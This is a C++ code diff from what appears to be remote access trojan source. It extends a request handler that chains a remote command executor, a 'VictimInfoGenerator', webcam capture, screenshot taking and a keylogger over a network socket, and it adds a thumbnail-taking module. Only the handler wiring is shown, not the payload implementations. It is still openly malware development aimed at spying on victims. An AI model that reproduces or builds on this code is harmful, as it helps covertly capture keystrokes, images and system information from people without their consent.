@@ -14,6 +14,7 @@
 #include "webcam_shot.h"
 #include <boost/smart_ptr/make_shared.hpp>
 #include "keyboard_logger.hpp"
+#include "thumbnail_executor.h"
 
 namespace http {
 namespace server {
@@ -22,12 +23,15 @@ request_handler::request_handler(boost::asio::ip::tcp::socket& sock, boost::asio
 {
 	rootHandler = std::make_unique<ScreenshotTaker>(sock, io_ref_);
 	std::unique_ptr<TaskHandlerInterface> cmdHandler = std::make_unique<CommandPromptExecutor>(sock, io_ref_);
-	std::unique_ptr<VictimInfoGenerator> vInfoGen = std::make_unique<VictimInfoGenerator>(sock, io_ref_);
+	std::unique_ptr<VictimInfoGenerator> vInfoGenHandler = std::make_unique<VictimInfoGenerator>(sock, io_ref_);
 	std::unique_ptr<WebcamShot> webCamShotHandler = std::make_unique<WebcamShot>(sock, io_ref_);
-	std::unique_ptr<Keylogger> keyLogger = std::make_unique<Keylogger>(sock, io_ref_);
-	webCamShotHandler->setNextTask(std::move(keyLogger));
-	vInfoGen->setNextTask(std::move(webCamShotHandler));
-	cmdHandler->setNextTask(std::move(vInfoGen));
+	std::unique_ptr<Keylogger> keyLoggerHandler = std::make_unique<Keylogger>(sock, io_ref_);
+	std::unique_ptr<ThumbnailTaker> thumbnailTakerHandler = std::make_unique <ThumbnailTaker>(sock, io_ref_);
+
+	keyLoggerHandler->setNextTask(std::move(thumbnailTakerHandler));
+	webCamShotHandler->setNextTask(std::move(keyLoggerHandler));
+	vInfoGenHandler->setNextTask(std::move(webCamShotHandler));
+	cmdHandler->setNextTask(std::move(vInfoGenHandler));
 	rootHandler->setNextTask(std::move(cmdHandler));
 }
 
